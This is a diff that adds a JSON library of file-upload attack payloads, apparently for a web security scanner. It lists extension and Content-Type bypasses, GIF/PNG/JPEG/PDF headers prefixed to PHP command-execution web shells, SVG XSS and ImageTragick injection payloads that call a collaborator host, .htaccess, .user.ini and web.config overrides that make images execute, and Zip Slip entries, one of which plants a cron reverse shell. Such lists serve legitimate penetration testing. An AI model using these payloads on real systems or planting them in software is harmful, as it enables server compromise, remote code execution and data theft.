@@ -1,0 +1,107 @@
+{
+  "category": "file_upload",
+  "contexts": {
+    "extension_bypass": {
+      "description": "File extension bypass techniques to upload executable files past extension filters",
+      "payloads": [
+        {"payload": "shell.php.jpg", "description": "Double extension — Apache may execute as PHP if AddHandler is misconfigured", "waf_bypass": false},
+        {"payload": "shell.php%00.jpg", "description": "Null byte truncation — strips .jpg before saving (PHP < 5.3.4)", "waf_bypass": true},
+        {"payload": "shell.pHp", "description": "Mixed case extension — bypasses case-sensitive blacklists", "waf_bypass": true},
+        {"payload": "shell.php5", "description": "Alternative PHP extension — often not blacklisted", "waf_bypass": true},
+        {"payload": "shell.phtml", "description": "Legacy PHP extension — parsed as PHP by default Apache configs", "waf_bypass": true},
+        {"payload": "shell.php.", "description": "Trailing dot — Windows strips it, leaving .php", "waf_bypass": true},
+        {"payload": "shell.php ::$DATA", "description": "NTFS alternate data stream — Windows IIS bypass", "waf_bypass": true},
+        {"payload": "shell.php;.jpg", "description": "Semicolon extension — IIS6 treats as .php", "waf_bypass": true},
+        {"payload": "shell.php%20", "description": "Trailing space — some systems strip whitespace after saving", "waf_bypass": true},
+        {"payload": "shell.shtml", "description": "Server-Side Include extension — executes SSI directives", "waf_bypass": true},
+        {"payload": "shell.jsp.png", "description": "Double extension for Java servers", "waf_bypass": false},
+        {"payload": "shell.aspx;.jpg", "description": "Semicolon extension bypass for ASP.NET/IIS", "waf_bypass": true},
+        {"payload": "shell.php7", "description": "PHP 7 extension — often missing from blacklists", "waf_bypass": true},
+        {"payload": "shell.php8", "description": "PHP 8 extension — newer extension not in legacy blacklists", "waf_bypass": true},
+        {"payload": "shell.phar", "description": "PHP archive extension — executable via phar:// stream wrapper", "waf_bypass": true},
+        {"payload": "shell.cgi", "description": "CGI extension — executes if CGI is enabled in server config", "waf_bypass": true},
+        {"payload": "shell.shtml", "description": "SSI extension — Server-Side Includes can execute commands via <!--#exec -->", "waf_bypass": true}
+      ]
+    },
+    "content_type_bypass": {
+      "description": "Content-Type header manipulation to bypass MIME-type validation",
+      "payloads": [
+        {"payload": "Content-Type: image/jpeg (with PHP content)", "description": "Set MIME to image/jpeg while uploading PHP — bypasses Content-Type checks", "waf_bypass": false},
+        {"payload": "Content-Type: image/png (with JSP content)", "description": "Set MIME to image/png while uploading JSP", "waf_bypass": false},
+        {"payload": "Content-Type: image/gif (with ASPX content)", "description": "Set MIME to image/gif while uploading ASPX", "waf_bypass": false},
+        {"payload": "Content-Type: application/octet-stream", "description": "Generic binary MIME type — often whitelisted", "waf_bypass": true},
+        {"payload": "Content-Type: text/plain (with PHP content)", "description": "Plain text MIME — may bypass image-only checks", "waf_bypass": true},
+        {"payload": "Dual Content-Type: image/jpeg and text/php", "description": "Two Content-Type headers — parser may use first while server uses second", "waf_bypass": true}
+      ]
+    },
+    "magic_bytes": {
+      "description": "Magic byte prepending to pass file signature validation while keeping payload executable",
+      "payloads": [
+        {"payload": "GIF89a; <?php system($_GET['c']); ?>", "description": "GIF header + PHP — passes GIF magic byte check, executes as PHP", "waf_bypass": true},
+        {"payload": "\\x89PNG\\r\\n\\x1a\\n <?php system($_GET['c']); ?>", "description": "PNG header + PHP — passes PNG signature validation", "waf_bypass": true},
+        {"payload": "\\xFF\\xD8\\xFF\\xE0 <?php system($_GET['c']); ?>", "description": "JPEG header + PHP — passes JPEG/JFIF magic byte check", "waf_bypass": true},
+        {"payload": "%PDF-1.4 <?php system($_GET['c']); ?>", "description": "PDF header + PHP — passes PDF signature check", "waf_bypass": true},
+        {"payload": "GIF89a<script>alert(1)</script>", "description": "GIF header + XSS — stored XSS via image rendering", "waf_bypass": true}
+      ]
+    },
+    "web_shells": {
+      "description": "Minimal web shell payloads for various server-side languages",
+      "payloads": [
+        {"payload": "<?php echo 'UPLOAD_TEST_OK'; ?>", "description": "PHP echo test — confirms PHP execution without harmful commands", "waf_bypass": false},
+        {"payload": "<?= 'UPLOAD_TEST_OK' ?>", "description": "PHP short tag echo — bypasses <?php keyword filters", "waf_bypass": true},
+        {"payload": "<% out.println(\"UPLOAD_TEST_OK\"); %>", "description": "JSP echo test — confirms JSP execution", "waf_bypass": false},
+        {"payload": "<%= \"UPLOAD_TEST_OK\" %>", "description": "JSP expression tag — alternative syntax", "waf_bypass": false},
+        {"payload": "<% Response.Write(\"UPLOAD_TEST_OK\") %>", "description": "Classic ASP echo test", "waf_bypass": false},
+        {"payload": "<%@ Page Language=\"C#\" %><%= \"UPLOAD_TEST_OK\" %>", "description": "ASPX echo test — confirms ASP.NET execution", "waf_bypass": false},
+        {"payload": "<?php echo(\"UPLOAD_TEST_OK\");__halt_compiler(); ?>", "description": "PHP with halt_compiler — minimal footprint, stops further parsing", "waf_bypass": true}
+      ]
+    },
+    "svg_xss": {
+      "description": "SVG files containing XSS payloads — browsers render SVGs and execute embedded JavaScript",
+      "payloads": [
+        {"payload": "<svg onload=alert('UPLOAD_TEST_OK')>", "description": "SVG onload XSS — simplest SVG XSS payload", "waf_bypass": false},
+        {"payload": "<svg xmlns=\"http://www.w3.org/2000/svg\"><script>alert('UPLOAD_TEST_OK')</script></svg>", "description": "SVG with embedded script element", "waf_bypass": false},
+        {"payload": "<svg><use href=\"data:image/svg+xml,<svg id='x' xmlns='http://www.w3.org/2000/svg'><image href='1' onerror='alert(1)'/></svg>#x\"/>", "description": "SVG use element with data URI — advanced XSS", "waf_bypass": true},
+        {"payload": "<svg><animate onbegin=alert(1) attributeName=x dur=1s>", "description": "SVG animate element XSS — less commonly filtered", "waf_bypass": true},
+        {"payload": "<svg><set onbegin=alert(1) attributename=x to=1>", "description": "SVG set element XSS — another uncommon event handler", "waf_bypass": true}
+      ]
+    },
+    "imagemagick": {
+      "description": "ImageTragick/ImageMagick RCE via crafted image files (CVE-2016-3714 class)",
+      "payloads": [
+        {"payload": "push graphic-context\nviewbox 0 0 640 480\nfill 'url(https://COLLABORATOR_URL/im|id; )'\npop graphic-context", "description": "ImageTragick MVG RCE via fill url() directive", "waf_bypass": false},
+        {"payload": "<?xml version=\"1.0\" encoding=\"UTF-8\"?><image><read filename=\"|id; \"/></image>", "description": "ImageMagick MSL command injection", "waf_bypass": false},
+        {"payload": "push graphic-context\nviewbox 0 0 640 480\nimage over 0,0 0,0 'https://COLLABORATOR_URL/'\npop graphic-context", "description": "ImageTragick SSRF via image fetch", "waf_bypass": false}
+      ]
+    },
+    "nodejs_bypass": {
+      "description": "Node.js-specific file upload bypasses for Express/Multer applications",
+      "payloads": [
+        {"payload": "shell.js", "description": "Upload .js file — may execute if in require() path", "waf_bypass": false},
+        {"payload": "shell.ejs", "description": "Upload EJS template — template injection via file upload", "waf_bypass": false},
+        {"payload": "shell.hbs", "description": "Upload Handlebars template", "waf_bypass": false},
+        {"payload": "shell.pug", "description": "Upload Pug/Jade template", "waf_bypass": false},
+        {"payload": "__proto__.json", "description": "Prototype pollution via filename", "waf_bypass": true}
+      ]
+    },
+    "server_config": {
+      "description": "Server configuration file upload attacks — overwrite or create config files to gain code execution",
+      "payloads": [
+        {"payload": ".htaccess\n\nAddType application/x-httpd-php .jpg", "description": "Apache .htaccess — makes .jpg files execute as PHP, then upload shell.jpg", "waf_bypass": false},
+        {"payload": "web.config\n\n<?xml version=\"1.0\" encoding=\"UTF-8\"?><configuration><system.webServer><handlers><add name=\"x\" path=\"*.jpg\" verb=\"*\" modules=\"IsapiModule\" scriptProcessor=\"%windir%\\System32\\inetsrv\\asp.dll\" /></handlers></system.webServer></configuration>", "description": "IIS web.config — registers custom handler to execute .jpg as ASP", "waf_bypass": false},
+        {"payload": ".user.ini\n\nauto_prepend_file=shell.jpg", "description": "PHP .user.ini — auto-includes shell.jpg before every PHP file in the directory", "waf_bypass": false},
+        {"payload": "crossdomain.xml\n\n<?xml version=\"1.0\"?><cross-domain-policy><allow-access-from domain=\"*\"/></cross-domain-policy>", "description": "Flash crossdomain.xml — allows any domain to read responses (CORS bypass for legacy Flash)", "waf_bypass": false},
+        {"payload": ".php.ini\n\nauto_prepend_file=/tmp/shell", "description": "PHP ini override — auto-prepends malicious file before every PHP execution in directory", "waf_bypass": false}
+      ]
+    },
+    "archive_attack": {
+      "description": "Archive-based file upload attacks — zip slip, symlink traversal, and path manipulation in compressed files",
+      "payloads": [
+        {"payload": "../../../../../../tmp/shell.php (as ZIP entry filename)", "description": "Zip Slip — path traversal in archive entry filename writes file outside extraction directory", "waf_bypass": false},
+        {"payload": "symlink -> /etc/passwd (as tar entry)", "description": "Symlink in tar/zip — archive contains symlink pointing to sensitive file, extraction follows link", "waf_bypass": false},
+        {"payload": "../../etc/cron.d/reverse-shell (as ZIP entry filename)", "description": "Zip Slip to cron — writes cron job for persistent reverse shell via archive extraction", "waf_bypass": false},
+        {"payload": "....//....//....//tmp/shell.php (as ZIP entry filename)", "description": "Double-dot-slash Zip Slip — alternative traversal syntax that bypasses single ../ stripping", "waf_bypass": true}
+      ]
+    }
+  }
+}
